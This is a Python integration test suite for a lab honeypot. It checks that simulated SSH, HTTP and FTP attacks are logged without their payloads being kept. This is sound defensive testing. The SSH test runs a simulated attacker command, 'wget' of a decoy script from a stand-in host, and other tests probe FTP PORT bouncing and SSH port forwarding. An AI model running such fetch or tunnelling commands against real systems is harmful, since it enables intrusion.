import asyncio
import hashlib
import io
import socket
import sys
import threading
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from honeypot.config import load_settings  # noqa: E402
from honeypot.server import LabHoneypot  # noqa: E402


class _LabThread:
    def __init__(self, root: Path):
        self.settings = load_settings(ROOT / "config" / "honeypot.json")
        self.settings.log_dir = root / "logs"
        self.settings.key_dir = root / "keys"
        self.settings.ssh.port = 0
        self.settings.http.port = 0
        self.settings.ftp.port = 0
        self.settings.dashboard.enabled = False
        self.loop = asyncio.new_event_loop()
        self.ready = threading.Event()
        self.error = None
        self.lab = None

    def start(self):
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        if not self.ready.wait(20):
            raise RuntimeError("honeypot did not start")
        if self.error:
            raise self.error

    def _run(self):
        asyncio.set_event_loop(self.loop)
        self.lab = LabHoneypot(self.settings, echo=False)
        try:
            self.loop.run_until_complete(self.lab.start())
        except Exception as exc:
            self.error = exc
            self.ready.set()
            return
        self.ready.set()
        self.loop.run_forever()

    def stop(self):
        if self.lab is not None and self.loop.is_running():
            future = asyncio.run_coroutine_threadsafe(self.lab.stop(), self.loop)
            future.result(10)
            self.loop.call_soon_threadsafe(self.loop.stop)
        self.thread.join(5)


class IntegrationTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        self._tmp = tempfile.TemporaryDirectory()
        self.runner = _LabThread(Path(self._tmp.name))
        self.runner.start()
        self.lab = self.runner.lab

    def tearDown(self):
        self.runner.stop()
        self._tmp.cleanup()

    def test_http_ftp_and_ssh_record_without_storing_payloads(self):
        self._http()
        self._ftp_port_does_not_connect()
        self._ftp_upload_is_discarded()
        self._ssh()
        events, _, _ = self.lab.log.read()
        text = "\n".join(__import__("json").dumps(event) for event in events)
        self.assertIn("training-only", text)
        self.assertNotIn("UNIQUE_BODY_MARKER_4433", text)
        self.assertNotIn("UNIQUE_UPLOAD_MARKER_9f3a", text)
        self.assertIn("discarded", text)
        self.assertIn("http://example.invalid/lab-decoy.sh", text)
        self.assertIn("Logged only", text)
        self.assertTrue((self.lab.settings.log_dir / "drop.bin").exists() is False)

    def _http(self):
        port = self.lab.http_port
        base = f"http://127.0.0.1:{port}"
        with urllib.request.urlopen(base + "/", timeout=5) as response:
            response.read()
        data = urllib.parse.urlencode({"username": "admin", "password": "training-only"}).encode()
        request = urllib.request.Request(base + "/login", data=data, method="POST")
        with urllib.request.urlopen(request, timeout=5) as response:
            body = response.read()
        self.assertNotIn(b"training-only", body)
        raw = b"note=UNIQUE_BODY_MARKER_4433"
        posted = urllib.request.Request(
            base + "/comment",
            data=raw,
            method="POST",
            headers={"Content-Type": "text/plain"},
        )
        try:
            with urllib.request.urlopen(posted, timeout=5) as response:
                response.read()
        except urllib.error.HTTPError as exc:
            exc.read()

    def _ftp_port_does_not_connect(self):
        probe = socket.socket()
        probe.bind(("127.0.0.1", 0))
        probe.listen(1)
        probe.settimeout(0.4)
        probe_port = probe.getsockname()[1]
        p1, p2 = divmod(probe_port, 256)
        try:
            with socket.create_connection(("127.0.0.1", self.lab.ftp_port), timeout=5) as sock:
                sock.settimeout(5)
                banner = _readline(sock)
                self.assertTrue(banner.startswith(b"220"))
                sock.sendall(f"PORT 127,0,0,1,{p1},{p2}\r\n".encode())
                reply = _readline(sock)
                self.assertIn(b"502", reply)
                sock.sendall(b"QUIT\r\n")
            time.sleep(0.3)
            with self.assertRaises(socket.timeout):
                probe.accept()
        finally:
            probe.close()

    def _ftp_upload_is_discarded(self):
        import ftplib

        payload = b"UNIQUE_UPLOAD_MARKER_9f3a\n"
        ftp = ftplib.FTP()
        ftp.connect("127.0.0.1", self.lab.ftp_port, timeout=8)
        ftp.login("backup", "training-only")
        listing = []
        ftp.retrlines("LIST", listing.append)
        self.assertTrue(any("README.txt" in line for line in listing))
        ftp.retrbinary("RETR README.txt", io.BytesIO().write)
        ftp.storbinary("STOR drop.bin", io.BytesIO(payload))
        ftp.quit()
        digest = hashlib.sha256(payload).hexdigest()
        events, _, _ = self.lab.log.read()
        blob = "\n".join(event.get("message") or "" for event in events)
        self.assertIn(digest, blob)
        self.assertNotIn("UNIQUE_UPLOAD_MARKER_9f3a", blob)

    def _ssh(self):
        import paramiko

        probe = socket.socket()
        probe.bind(("127.0.0.1", 0))
        probe.listen(1)
        probe.settimeout(0.4)
        probe_port = probe.getsockname()[1]
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                "127.0.0.1",
                port=self.lab.ssh.port,
                username="root",
                password="training-only",
                timeout=10,
                banner_timeout=10,
                auth_timeout=10,
                look_for_keys=False,
                allow_agent=False,
            )
            try:
                client.get_transport().open_channel(
                    "direct-tcpip",
                    ("127.0.0.1", probe_port),
                    ("127.0.0.1", 0),
                )
            except Exception:
                pass
            time.sleep(0.3)
            with self.assertRaises(socket.timeout):
                probe.accept()
            _stdin, stdout, _stderr = client.exec_command("wget http://example.invalid/lab-decoy.sh")
            output = stdout.read().decode("utf-8", "replace")
            self.assertIn("unable to resolve", output)
        finally:
            client.close()
            probe.close()


def _readline(sock: socket.socket) -> bytes:
    data = b""
    while not data.endswith(b"\n"):
        piece = sock.recv(1)
        if not piece:
            break
        data += piece
    return data


if __name__ == "__main__":
    unittest.main()
